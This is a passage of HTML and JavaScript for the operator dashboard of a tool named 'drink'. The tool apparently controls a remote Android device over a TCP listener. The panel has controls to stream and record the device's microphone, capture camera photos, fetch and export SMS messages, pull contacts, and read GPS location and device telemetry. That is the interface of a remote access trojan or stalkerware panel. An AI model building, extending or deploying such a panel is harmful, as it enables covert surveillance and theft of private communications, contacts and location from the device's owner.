      <input type="text" id="loginUser" autocomplete="username" placeholder="Username" data-i18n-ph="username" onkeydown="if(event.key==='Enter')submitLogin()">
    </div>
    <div class="login-field">
      <label data-i18n="password">Password</label>
      <input type="password" id="loginPass" autocomplete="current-password" placeholder="Password" data-i18n-ph="password" onkeydown="if(event.key==='Enter')submitLogin()">
    </div>
    <button class="btn-primary login-btn" onclick="submitLogin()" data-i18n="sign_in">Sign In</button>
    <div class="login-error" id="loginError"></div>
  </div>
</div>

<div id="mainApp" style="display: none;">
<header>
  <div class="header-left">
    <div class="brand-wrap">
      <div class="brand-icon">
        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2v20M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/></svg>
      </div>
      <span class="brand-name">drink</span>
    </div>
    <div class="status-badges">
      <span class="badge" id="pillTcp">
        <span class="badge-dot"></span>
        <span id="txtTcp">TCP: Stopped</span>
      </span>
      <span class="badge" id="pillClient">
        <span class="badge-dot"></span>
        <span id="txtClient">Client: Disconnected</span>
      </span>
      <span class="badge" id="pillMic">
        <span class="badge-dot"></span>
        <span id="txtMic">Mic: Off</span>
      </span>
      <span class="badge" id="pillBattery" style="display: none;">
        <span class="badge-dot" id="dotBattery" style="background: var(--success);"></span>
        <span id="txtBattery">Battery: --</span>
      </span>
    </div>
  </div>

  <div class="header-actions">
    <button class="btn-success" id="btnHeaderStart" onclick="toggleServerListen()">
      <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><polygon points="5 3 19 12 5 21 5 3"/></svg>
      <span id="txtHeaderStart" data-i18n="start_listen">Start Listen</span>
    </button>
    <button class="btn-danger" id="btnHeaderDisconnect" onclick="disconnectClient()">
      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M18 6L6 18"/><path d="M6 6l12 12"/></svg>
      <span data-i18n="disconnect_client">Disconnect</span>
    </button>
    <button class="btn-secondary btn-icon" onclick="killServer()" title="Kill Server" data-i18n-title="kill_server">
      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M18.36 6.64a9 9 0 1 1-12.73 0"/><line x1="12" y1="2" x2="12" y2="12"/></svg>
    </button>
    <div class="header-divider"></div>
    <button class="btn-secondary" id="btnLang" style="font-weight: 600;" onclick="toggleLanguage()">FA</button>
    <button class="btn-secondary btn-icon" id="btnTheme" onclick="toggleTheme()" title="Toggle Theme">
      <svg id="themeIcon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg>
    </button>
    <button class="btn-secondary btn-icon" id="btnLogout" onclick="logout()" title="Logout" data-i18n-title="logout">
      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></svg>
    </button>
  </div>
</header>

<div class="container">
  <div class="overview-grid">

    <div class="card">
      <div class="card-header">
        <div class="card-title-wrap">
          <div class="card-icon-badge">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="2" width="20" height="8" rx="2" ry="2"/><rect x="2" y="14" width="20" height="8" rx="2" ry="2"/><line x1="6" y1="6" x2="6.01" y2="6"/><line x1="6" y1="18" x2="6.01" y2="18"/></svg>
          </div>
          <span class="card-title" data-i18n="server_host">Server & Connection</span>
        </div>
      </div>
      <div class="card-body">
        <div class="info-row">
          <span class="info-label" data-i18n="tcp_target">TCP Target</span>
          <span class="info-val monospace-val" id="valTcpHost">192.168.1.149:33110</span>
        </div>
        <div class="info-row">
          <span class="info-label" data-i18n="remote_address">Remote Client</span>
          <span class="info-val monospace-val" id="valClientAddr">Disconnected</span>
        </div>
        <div class="info-row">
          <span class="info-label" data-i18n="session_status">Client Status</span>
          <span class="info-val" id="valClientStatus">Waiting for connection…</span>
        </div>
        <div class="info-row">
          <span class="info-label" data-i18n="listen_state">Listen State</span>
          <span class="info-val" id="valListenState">Idle</span>
        </div>
      </div>
      <div class="card-footer-actions">
        <button class="btn-primary" id="btnToggleListenCard" onclick="toggleServerListen()" data-i18n="start_listen">Start Listen</button>
        <button class="btn-danger" id="btnDisconnectCard" onclick="disconnectClient()" data-i18n="disconnect_client">Disconnect</button>
      </div>
    </div>

    <div class="card">
      <div class="card-header">
        <div class="card-title-wrap">
          <div class="card-icon-badge" style="background: var(--success-light); color: var(--success);">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 1a3 3 0 0 0-3 3v8a3 3 0 0 0 6 0V4a3 3 0 0 0-3-3z"/><path d="M19 10v2a7 7 0 0 1-14 0v-2"/><line x1="12" y1="19" x2="12" y2="23"/><line x1="8" y1="23" x2="16" y2="23"/></svg>
          </div>
          <span class="card-title" data-i18n="mic_stream">Microphone Stream</span>
        </div>
        <a href="/mic" target="_blank" class="btn btn-secondary btn-icon" title="Open in new tab">
          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/></svg>
        </a>
      </div>
      <div class="card-body">
        <div class="info-row">
          <span class="info-label" data-i18n="stream_mode">Stream Status</span>
          <span class="info-val" id="valMicStatus">Inactive</span>
        </div>
        <div class="info-row">
          <span class="info-label" data-i18n="audio_route">Audio Route</span>
          <span class="info-val monospace-val">/mic (/ws/audio)</span>
        </div>
        <div style="margin: 6px 0 2px 0;">
          <canvas id="cardMicCanvas" width="280" height="36" style="width: 100%; height: 36px; border-radius: 8px; background: #141416; display: block;"></canvas>
          <div style="width: 100%; height: 4px; background: var(--border-light); border-radius: 99px; overflow: hidden; margin-top: 5px;">
            <div id="cardVuBar" style="width: 0%; height: 100%; background: var(--success); transition: width 0.05s ease;"></div>
          </div>
        </div>
        <div class="info-row" style="border-bottom: none; padding-top: 2px;">
          <span class="info-label" data-i18n="audio_gain">Gain Booster</span>
          <div style="display: flex; align-items: center; gap: 8px;">
            <input type="range" id="cardGainSlider" min="1" max="5" step="0.2" value="1" style="width: 75px; accent-color: var(--accent);" oninput="setCardGain(this.value)">
            <span id="cardGainVal" class="monospace-val" style="font-weight: 600; font-size: 0.76rem;">1.0x</span>
          </div>
        </div>
      </div>
      <div class="card-footer-actions">
        <button class="btn-success" id="btnToggleMic" onclick="toggleMic()">
          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="5 3 19 12 5 21 5 3"/></svg>
          <span id="txtBtnMic" data-i18n="start_mic">Start Mic</span>
        </button>
        <button class="btn-secondary" id="btnCardListen" onclick="toggleCardAudio()">
          <svg id="iconCardListen" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"/><path d="M19.07 4.93a10 10 0 0 1 0 14.14M15.54 8.46a5 5 0 0 1 0 7.07"/></svg>
          <span id="txtCardListen" data-i18n="listen_live">Listen</span>
        </button>
        <button class="btn-secondary" id="btnCardRecord" onclick="toggleCardRecord()">
          <span class="rec-pulse-dot" id="cardRecDot"></span>
          <span id="txtCardRecord" data-i18n="record_audio">Record</span>
        </button>
        <button class="btn-secondary" id="btnCardStt" onclick="toggleCardStt()">
          <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 1a3 3 0 0 0-3 3v8a3 3 0 0 0 6 0V4a3 3 0 0 0-3-3z"/><path d="M19 10v2a7 7 0 0 1-14 0v-2"/><line x1="12" y1="19" x2="12" y2="23"/><line x1="8" y1="23" x2="16" y2="23"/></svg>
          <span id="txtCardStt" data-i18n="speech_transcription">Transcribe</span>
        </button>
      </div>
      <div id="cardSttDrawer" style="display: none; margin-top: 10px; padding: 10px; background: var(--bg-card-subtle); border-radius: 10px; border: 1px solid var(--border); font-size: 0.78rem;">
        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 6px;">
          <strong data-i18n="speech_transcription">Live Speech-to-Text</strong>
          <div style="display: flex; gap: 4px;">
            <button class="btn-secondary" style="padding: 2px 6px; font-size: 0.68rem;" onclick="copyCardStt()" data-i18n="copy">Copy</button>
            <button class="btn-secondary" style="padding: 2px 6px; font-size: 0.68rem;" onclick="clearCardStt()" data-i18n="clear">Clear</button>
          </div>
        </div>
        <div id="cardSttText" style="max-height: 60px; overflow-y: auto; color: var(--text-main);" data-i18n="stt_placeholder">Listening for speech…</div>
      </div>
    </div>

    <div class="card">
      <div class="card-header">
        <div class="card-title-wrap">
          <div class="card-icon-badge" style="background: var(--warning-light); color: var(--warning);">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/><circle cx="12" cy="13" r="4"/></svg>
          </div>
          <span class="card-title" data-i18n="cam_capture">Camera Capture</span>
        </div>
        <button class="btn-secondary btn-icon" onclick="listCameras()" title="Refresh Cameras" data-i18n-title="list_cams">
          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="23 4 23 10 17 10"/><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"/></svg>
        </button>
      </div>
      <div class="card-body">
        <div class="cam-pills-row" id="camPillsBox"></div>
        <div class="preview-container" id="camPreviewBox" onclick="openPhotoModal()">
          <span class="preview-empty-state" id="camPreviewEmpty" data-i18n="no_photo">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21 15 16 10 5 21"/></svg>
            No photo captured
          </span>
          <img id="camPreviewImg" style="display: none;">
        </div>
      </div>
      <div class="card-footer-actions">
        <button class="btn-primary" id="btnTakePhoto" onclick="captureSelectedCamera()">
          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="13" r="4"/></svg>
          <span data-i18n="take_photo">Take Photo</span>
        </button>
      </div>
    </div>

  </div>

  <div class="workspace-card">
    <div class="workspace-tabbar">
      <button class="tab-btn active" id="tabBtnSms" onclick="switchWorkspaceTab('sms')">
        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
        <span data-i18n="sms_title">SMS Messages</span>
        <span class="tab-count-badge" id="badgeSmsCount">0</span>
      </button>
      <button class="tab-btn" id="tabBtnContacts" onclick="switchWorkspaceTab('contacts')">
        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>
        <span data-i18n="contacts">Contacts</span>
        <span class="tab-count-badge" id="badgeContactsCount">0</span>
      </button>
      <button class="tab-btn" id="tabBtnTelemetry" onclick="switchWorkspaceTab('telemetry')">
        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
        <span data-i18n="device_telemetry">Device Telemetry</span>
        <span class="tab-count-badge" id="badgeTelemetry">Manual</span>
      </button>
      <button class="tab-btn" id="tabBtnConsole" onclick="switchWorkspaceTab('console')">
        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>
        <span data-i18n="activity_console">Activity Console</span>
      </button>
    </div>

    <div class="workspace-content">

      <div class="tab-panel active" id="panelSms">
        <div class="panel-toolbar">
          <div class="search-box">
            <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
            <input type="text" id="smsSearchInput" placeholder="Search number or message content…" data-i18n-ph="search_sms_ph" oninput="filterMessages()">
          </div>

          <div style="display: flex; align-items: center; gap: 6px; flex-wrap: wrap;">
            <input type="date" id="smsStartDate" onchange="filterMessages()" title="Start Date" data-i18n-title="start_date">
            <input type="date" id="smsEndDate" onchange="filterMessages()" title="End Date" data-i18n-title="end_date">
            <button class="btn-secondary" style="padding: 6px 10px;" onclick="clearSmsDateFilter()" data-i18n="clear" title="Clear Date Filter">Clear</button>
          </div>

          <div class="filter-pills-wrap">
            <button class="filter-item-pill active" id="pillDirAll" onclick="setDirFilter('all')" data-i18n="all">All</button>
            <button class="filter-item-pill" id="pillDirIn" onclick="setDirFilter('in')" data-i18n="received">Received</button>
            <button class="filter-item-pill" id="pillDirOut" onclick="setDirFilter('out')" data-i18n="sent">Sent</button>
          </div>

          <div style="display: flex; align-items: center; gap: 6px; margin-inline-start: auto;">
            <input type="number" id="smsHoursInput" value="24" style="width: 68px;" placeholder="Hours" data-i18n-ph="hours">
            <button class="btn-primary" onclick="getSms(document.getElementById('smsHoursInput').value)" data-i18n="fetch_sms">
              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="23 4 23 10 17 10"/><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"/></svg>
              <span>Fetch</span>
            </button>
            <button class="btn-secondary" onclick="downloadSms()" data-i18n="download_sms">
              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
              <span>Export</span>
            </button>
          </div>
        </div>

        <div class="panel-body-scroll">
          <div class="messages-flow" id="workspaceMessagesStack"></div>
        </div>
      </div>

      <div class="tab-panel" id="panelContacts">
        <div class="panel-toolbar">
          <div class="search-box">
            <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
            <input type="text" id="contactsSearchInput" placeholder="Search contacts by name or phone…" data-i18n-ph="search_contacts_ph" oninput="filterContacts()">
          </div>

          <div style="display: flex; align-items: center; gap: 8px; margin-inline-start: auto;">
            <button class="btn-primary" onclick="pullContacts()">
              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
              <span data-i18n="pull_device">Pull from Device</span>
            </button>
            <a href="/api/contacts/download" id="btnWorkspaceDlZip" class="btn btn-secondary" style="display: none;">
              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
              <span data-i18n="download_zip">Download ZIP</span>
            </a>
          </div>
        </div>

        <div class="panel-body-scroll">
          <div class="contacts-flow-grid" id="workspaceContactsGrid"></div>
        </div>
      </div>

      <div class="tab-panel" id="panelConsole">
        <div class="log-terminal-window">
          <div class="log-terminal-bar">
            <div style="display: flex; align-items: center; gap: 8px;">
              <span style="display: inline-flex; gap: 5px;">
                <span style="width: 10px; height: 10px; border-radius: 50%; background: #ff5f56; display: inline-block;"></span>
                <span style="width: 10px; height: 10px; border-radius: 50%; background: #ffbd2e; display: inline-block;"></span>
                <span style="width: 10px; height: 10px; border-radius: 50%; background: #27c93f; display: inline-block;"></span>
              </span>
              <span style="color: #8e8e93; font-size: 0.76rem; font-family: var(--font-mono); margin-inline-start: 6px;">drink-server activity.log</span>
            </div>
            <div style="display: flex; gap: 8px;">
              <button class="btn-secondary" style="padding: 4px 8px; font-size: 0.72rem; background: #282830; border-color: #383842; color: #f5f5f7;" onclick="clearLogs()" data-i18n="clear">Clear</button>
            </div>
          </div>
          <div class="log-console" id="logConsole"></div>
        </div>
      </div>

      <div class="tab-panel" id="panelTelemetry">
        <div class="panel-toolbar">
          <button class="btn-primary" id="btnFetchTel" onclick="fetchDeviceTelemetry()">
            <svg id="iconFetchTel" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="23 4 23 10 17 10"/><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"/></svg>
            <span id="txtBtnFetchTel" data-i18n="fetch_telemetry">Fetch Telemetry</span>
          </button>
          <span id="txtTelLastUpdated" style="font-size: 0.78rem; color: var(--text-muted); margin-inline-start: 6px;">Last updated: Never</span>
          <button class="btn-secondary" style="margin-inline-start: auto;" id="btnExportTel" onclick="exportTelemetryJson()">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
            <span>Export</span>
          </button>
        </div>

        <div class="panel-body-scroll">
          <div id="telEmptyBox" style="text-align: center; color: var(--text-muted); padding: 70px 20px;">
            <svg width="42" height="42" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" style="margin-bottom: 12px; opacity: 0.4;"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
            <p style="font-size: 0.88rem; max-width: 440px; margin: 0 auto; line-height: 1.5;" data-i18n="telemetry_not_fetched">No telemetry fetched yet. Click 'Fetch Telemetry' to retrieve device status on demand without battery drain.</p>
          </div>

          <div id="telContentBox" style="display: none; flex-direction: column; gap: 14px;">
            <div class="telemetry-grid">
              <div class="card" style="padding: 16px;">
                <div class="card-header" style="margin-bottom: 12px;">
                  <div class="card-title-wrap">
                    <div class="card-icon-badge" style="background: var(--success-light); color: var(--success);">
                      <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="1" y="6" width="18" height="12" rx="2" ry="2"/><line x1="23" y1="13" x2="23" y2="11"/></svg>
                    </div>
                    <span class="card-title" data-i18n="battery_power">Battery & Power</span>
                  </div>
                  <span id="telBatteryHeaderPct" style="font-size: 1.15rem; font-weight: 700;">--%</span>
                </div>
                <div class="progress-bar-wrap" style="margin-bottom: 12px;">
                  <div class="progress-bar-fill" id="telBatteryBar" style="width: 0%; background: var(--success);"></div>
                </div>
                <div class="card-body" style="gap: 6px;">
                  <div class="info-row"><span class="info-label" data-i18n="charging_state">Charging Status</span><span class="info-val" id="telCharging">--</span></div>
                  <div class="info-row"><span class="info-label" data-i18n="power_source">Power Source</span><span class="info-val" id="telPlugged">--</span></div>
                  <div class="info-row"><span class="info-label" data-i18n="battery_temp">Temperature</span><span class="info-val monospace-val" id="telTemp">-- °C</span></div>
                  <div class="info-row"><span class="info-label" data-i18n="battery_voltage">Voltage</span><span class="info-val monospace-val" id="telVolt">-- V</span></div>
                  <div class="info-row" style="border-bottom: none;"><span class="info-label" data-i18n="battery_health">Health</span><span class="info-val" id="telHealth">--</span></div>
                </div>
              </div>

              <div class="card" style="padding: 16px;">
                <div class="card-header" style="margin-bottom: 12px;">
                  <div class="card-title-wrap">
                    <div class="card-icon-badge" style="background: var(--accent-light); color: var(--accent);">
                      <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12.55a11 11 0 0 1 14.08 0"/><path d="M1.42 9a16 16 0 0 1 21.16 0"/><path d="M8.53 16.11a6 6 0 0 1 6.95 0"/><line x1="12" y1="20" x2="12.01" y2="20"/></svg>
                    </div>
                    <span class="card-title" data-i18n="network_info">Network Information</span>
                  </div>
                  <span class="badge badge-active" id="telNetBadge">Active</span>
                </div>
                <div class="card-body" style="gap: 6px;">
                  <div class="info-row"><span class="info-label" data-i18n="network_type">Network Type</span><span class="info-val" id="telNetType">--</span></div>
                  <div class="info-row"><span class="info-label" data-i18n="wifi_ssid">WiFi SSID</span><span class="info-val monospace-val" id="telNetSsid">--</span></div>
                  <div class="info-row"><span class="info-label" data-i18n="local_ip">Local IP</span><span class="info-val monospace-val" id="telNetIp">--</span></div>
                  <div class="info-row" style="border-bottom: none;"><span class="info-label" data-i18n="cellular_carrier">Cellular Carrier</span><span class="info-val" id="telCarrier">--</span></div>
                </div>
              </div>

              <div class="card" style="padding: 16px;">
                <div class="card-header" style="margin-bottom: 12px;">
                  <div class="card-title-wrap">
                    <div class="card-icon-badge" style="background: var(--warning-light); color: var(--warning);">
                      <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"/><path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"/></svg>
                    </div>
                    <span class="card-title" data-i18n="storage_memory">Storage & Memory</span>
                  </div>
                </div>
                <div class="card-body" style="gap: 12px;">
                  <div>
                    <div style="display: flex; justify-content: space-between; font-size: 0.78rem; margin-bottom: 5px;">
                      <span style="font-weight: 600;" data-i18n="internal_storage">Internal Storage</span>
                      <span id="telStorageText" class="monospace-val">--</span>
                    </div>
                    <div class="progress-bar-wrap">
                      <div class="progress-bar-fill" id="telStorageBar" style="width: 0%; background: var(--accent);"></div>
                    </div>
                  </div>
                  <div>
                    <div style="display: flex; justify-content: space-between; font-size: 0.78rem; margin-bottom: 5px;">
                      <span style="font-weight: 600;" data-i18n="ram_memory">RAM Memory</span>
                      <span id="telRamText" class="monospace-val">--</span>
                    </div>
                    <div class="progress-bar-wrap">
                      <div class="progress-bar-fill" id="telRamBar" style="width: 0%; background: var(--warning);"></div>
                    </div>
                  </div>
                </div>
              </div>

              <div class="card" style="padding: 16px;">
                <div class="card-header" style="margin-bottom: 12px;">
                  <div class="card-title-wrap">
                    <div class="card-icon-badge" style="background: var(--accent-light); color: var(--accent);">
                      <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg>
                    </div>
                    <span class="card-title" data-i18n="device_os">Device & OS Details</span>
                  </div>
                </div>
                <div class="card-body" style="gap: 6px;">
                  <div class="info-row"><span class="info-label" data-i18n="model">Model</span><span class="info-val" id="telModel">--</span></div>
                  <div class="info-row"><span class="info-label" data-i18n="manufacturer">Manufacturer</span><span class="info-val" id="telManufacturer">--</span></div>
                  <div class="info-row"><span class="info-label" data-i18n="android_version">Android Version</span><span class="info-val monospace-val" id="telAndroidVer">--</span></div>
                  <div class="info-row"><span class="info-label" data-i18n="security_patch">Security Patch</span><span class="info-val monospace-val" id="telSecurityPatch">--</span></div>
                  <div class="info-row" style="border-bottom: none;"><span class="info-label" data-i18n="uptime">System Uptime</span><span class="info-val monospace-val" id="telUptime">--</span></div>
                </div>
              </div>
            </div>

            <div class="card" style="padding: 16px;">
              <div class="card-header" style="margin-bottom: 12px;">
                <div class="card-title-wrap">
                  <div class="card-icon-badge" style="background: var(--danger-light); color: var(--danger);">
                    <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg>
                  </div>
                  <span class="card-title" data-i18n="gps_location">GPS Location</span>
                </div>
                <div id="telLocLinks" style="display: flex; gap: 8px;">
                  <a href="#" id="linkGmaps" target="_blank" class="btn btn-secondary" style="padding: 4px 10px; font-size: 0.74rem;" data-i18n="open_gmaps">Google Maps</a>
                  <a href="#" id="linkOsm" target="_blank" class="btn btn-secondary" style="padding: 4px 10px; font-size: 0.74rem;" data-i18n="open_osm">OpenStreetMap</a>
                </div>
              </div>
              <div id="telLocInfoRow" style="display: flex; gap: 16px; flex-wrap: wrap; font-size: 0.8rem; margin-bottom: 12px;">
                <div><span style="color: var(--text-muted);" data-i18n="latitude">Latitude</span>: <strong id="telLat" class="monospace-val">--</strong></div>
                <div><span style="color: var(--text-muted);" data-i18n="longitude">Longitude</span>: <strong id="telLon" class="monospace-val">--</strong></div>
                <div><span style="color: var(--text-muted);" data-i18n="accuracy">Accuracy</span>: <strong id="telAccuracy" class="monospace-val">--</strong></div>
                <div><span style="color: var(--text-muted);" data-i18n="altitude">Altitude</span>: <strong id="telAltitude" class="monospace-val">--</strong></div>
                <button class="btn-secondary" style="padding: 2px 8px; font-size: 0.7rem;" onclick="copyCoords()" data-i18n="copy">Copy</button>
              </div>
              <div id="telMapBox" style="height: 240px; border-radius: 12px; overflow: hidden; border: 1px solid var(--border);"></div>
              <div id="telNoGpsMsg" style="display: none; text-align: center; color: var(--text-muted); padding: 30px; font-size: 0.84rem;" data-i18n="no_gps_data">GPS location unavailable or permission not granted</div>
            </div>
          </div>
        </div>
      </div>

    </div>
  </div>

</div>

<div class="modal-backdrop" id="photoModalBackdrop" onclick="closePhotoModal()">
  <div style="max-width: 90vw; max-height: 90vh; display: flex; flex-direction: column; align-items: center; gap: 12px;" onclick="event.stopPropagation()">
    <img id="photoModalImg" style="max-width: 90vw; max-height: 80vh; border-radius: 12px; box-shadow: 0 8px 32px rgba(0,0,0,0.5);">
    <div style="display: flex; gap: 8px;">
      <a id="btnPhotoDl" href="/api/photo/latest" download="camera_capture.jpg" class="btn btn-primary" data-i18n="download_photo">Download Photo</a>
      <button class="btn-secondary" onclick="closePhotoModal()" data-i18n="close">Close</button>
    </div>
  </div>
</div>
</div>

<script>
let allMessages = [];
let allContacts = [];
let currentDirFilter = 'all';
let selectedCamId = '0';
let currentLang = 'en';
let currentTab = 'sms';
let isListening = false;
let isMicActive = false;
window.lastFilteredSms = [];

const I18N = {
  en: {
    brand: "drink",
    tcp_stopped: "TCP: Stopped",
    tcp_listening: "TCP: Listening",
    client_disconnected: "Client: Disconnected",
    client_connected: "Client: Connected",
    mic_off: "Mic: Off",
    mic_streaming: "Mic: Streaming",
    server_host: "Server & Connection",
    tcp_target: "TCP Target",
    remote_address: "Remote Client",
    session_status: "Client Status",
    listen_state: "Listen State",
    idle: "Idle",
    active_listening: "Active listening",
    stopped: "Stopped",
    start_listen: "Start Listen",
    stop_listen: "Stop Listen",
    kill_server: "Kill Server",
    disconnect_client: "Disconnect",
    online: "Online",
    waiting_connection: "Waiting for connection…",
    server_stopped: "Server stopped",
    mic_stream: "Microphone Stream",
    stream_mode: "Stream Status",
    inactive: "Inactive",
    streaming_live: "Streaming live",
    audio_route: "Audio Route",
    start_mic: "Start Mic",
    stop_mic: "Stop Mic",
    cam_capture: "Camera Capture",
    no_photo: "No photo captured",
    list_cams: "Refresh",
    take_photo: "Take Photo",
    sms_title: "SMS Messages",
    fetch_sms: "Fetch",
    download_sms: "Export",
    no_messages: "No messages loaded",
    contacts: "Contacts",
    pull_device: "Pull from Device",
    download_zip: "Download ZIP",
    activity_console: "Activity Console",
    clear: "Clear",
    search_sms_ph: "Search number or message content…",
    start_date: "Start Date",
    end_date: "End Date",
    all: "All",
    received: "Received",
    sent: "Sent",
    search_contacts_ph: "Search contacts by name or phone…",
    copy: "Copy",
    no_contacts_found: "No contacts found",
    no_sms_criteria: "No messages matching criteria",
    download_photo: "Download Photo",
